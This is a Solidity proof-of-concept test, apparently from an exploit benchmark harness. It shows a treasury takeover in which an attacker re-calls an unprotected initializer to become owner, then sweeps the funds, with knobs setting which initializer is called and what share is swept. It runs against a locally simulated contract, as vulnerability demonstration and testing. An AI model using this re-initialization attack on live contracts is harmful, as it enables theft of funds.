// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Treasury} from "../src/Treasury.sol";

/// @notice Access control through an initializer: the initializers set the owner and nothing
///         stops a second call, so anyone can make themselves the owner and sweep the treasury.
/// Knobs:
///   0 `initializer`  0: the attacker calls `initialize`; 1: it calls `initializeWithFee`;
///   1 `sweep_bps`    the part of the treasury that is swept, in basis points.
/// The treasury was set up by its administrator and holds 10 ether.
contract TreasuryTakeoverPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    Treasury internal treasury;
    address internal admin;

    function setUpTarget() internal override {
        admin = makeAddr("admin");
        treasury = new Treasury();
        treasury.initializeWithFee(admin, 100);
        address donor = makeAddr("donor");
        vm.deal(donor, 10 ether);
        vm.prank(donor);
        treasury.fund{value: 10 ether}();

        declareAttackerBalance(0.01 ether, 0, 1 ether);
        declareKnob(0, "initializer", 0, 0, 1);
        declareKnob(1, "sweep_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        if (knob(0) == 0) {
            treasury.initialize(attacker);
        } else {
            treasury.initializeWithFee(attacker, 0);
        }
        treasury.sweep(payable(attacker), address(treasury).balance * knob(1) / BPS);
        vm.stopPrank();

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
